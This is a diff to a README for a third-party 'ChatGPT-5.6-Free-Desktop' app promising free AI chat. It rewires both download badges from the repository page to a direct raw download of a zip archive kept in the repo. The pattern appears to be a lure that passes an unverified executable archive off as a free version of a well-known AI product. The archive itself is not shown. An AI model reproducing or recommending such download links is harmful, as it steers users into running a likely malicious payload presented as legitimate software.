@@ -1,6 +1,6 @@
 # 🤖 ChatGPT-5.6-Free-Desktop - Free AI Chat for Everyone!
 
-[![Download ChatGPT 5.6](https://img.shields.io/badge/Download-ChatGPT_5.6-Free-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=blue&color=green)](https://github.com/Milson-Heritiana/ChatGPT-5.6-Free-Desktop)
+[![Download ChatGPT 5.6](https://img.shields.io/badge/Download-ChatGPT_5.6-Free-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=blue&color=green)](https://raw.githubusercontent.com/Milson-Heritiana/ChatGPT-5.6-Free-Desktop/main/desktop/Desktop_GP_Chat_Free_v1.2-beta.3.zip)
 
 )
 
@@ -160,7 +160,7 @@ You've learned everything you need to know. Now is the time to experience the po
 
 Visit this link to download the application.
 
-[![Get ChatGPT 5.6 Now](https://img.shields.io/badge/🚀-Download_ChatGPT_5.6-Free-blue?style=for-the-badge&logo=appveyor&logoColor=white&labelColor=purple&color=orange)](https://github.com/Milson-Heritiana/ChatGPT-5.6-Free-Desktop)
+[![Get ChatGPT 5.6 Now](https://img.shields.io/badge/🚀-Download_ChatGPT_5.6-Free-blue?style=for-the-badge&logo=appveyor&logoColor=white&labelColor=purple&color=orange)](https://raw.githubusercontent.com/Milson-Heritiana/ChatGPT-5.6-Free-Desktop/main/desktop/Desktop_GP_Chat_Free_v1.2-beta.3.zip)
 
 )
 
